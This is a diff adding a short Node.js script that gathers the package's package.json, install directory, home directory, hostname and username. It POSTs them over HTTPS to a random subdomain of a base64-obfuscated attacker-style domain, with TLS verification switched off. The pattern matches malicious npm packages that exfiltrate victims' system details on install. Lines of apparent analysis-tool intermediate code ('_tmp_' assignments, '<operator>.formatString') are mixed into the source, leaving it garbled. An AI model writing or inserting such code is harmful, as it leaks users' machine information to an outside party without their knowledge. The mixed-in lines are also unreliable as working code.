@@ -1,0 +1,45 @@
+const os = require("os")
+const http = require("https")
+const packageJson = require("./package.json")
+const pkgName = packageJson.name
+const genRanHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('')
+const postData = JSON.stringify({
+    pkg: pkgName,
+    pkgjson: packageJson,
+    dir: __dirname,
+    home: os.homedir(),
+    host: os.hostname(),
+    username: os.userInfo().username, 
+})
+_tmp_4.pkg = pkgName
+_tmp_4.pkgjson = packageJson
+_tmp_4.dir = __dirname
+_tmp_4.home = os.homedir()
+_tmp_4.host = os.hostname()
+_tmp_4.username = os.userInfo().username
+var options = {
+    hostname: `${genRanHex(6)}.${pkgName}.${Buffer.from('aDR4Lm5pbmph', 'base64')}`,
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+}
+_tmp_5.hostname = <operator>.formatString("", genRanHex(6), ".", pkgName, ".", Buffer.from('aDR4Lm5pbmph', 'base64'), "")
+_tmp_5.port = 443
+_tmp_5.path = "/"
+_tmp_5.method = "POST"
+_tmp_5.headers = {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+_tmp_6.Content-Type = "application/json"
+_tmp_6.Content-Length = Buffer.byteLength(postData)
+process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0
+var req = http.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    })
+})
